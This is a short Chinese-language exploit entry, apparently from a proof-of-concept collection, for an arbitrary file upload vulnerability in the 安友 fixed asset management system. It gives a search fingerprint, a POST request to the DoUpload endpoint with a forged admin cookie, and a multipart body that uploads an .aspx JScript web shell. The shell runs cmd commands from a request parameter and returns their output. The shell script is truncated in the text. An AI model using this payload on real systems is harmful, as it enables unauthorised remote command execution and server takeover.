# 安友固定资产管理系统DoUpload存在任意文件上传漏洞

- **系统**：安友固定资产管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="style/v2/layuiadmin/lib/"`
- **请求**：`POST /manage/Attachment/DoUpload?bocode=1 HTTP/1.1`
- **关键头**：`Cookie: AnnYouDevBaseAdfv3adfUserCode=admin;`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc…`

**请求体 / payload**
```
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="file" filename="1.aspx"
Content-Type: image/png
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.…（脚本共 698 字，完整版见原文）
```
- **预期**：200　|　—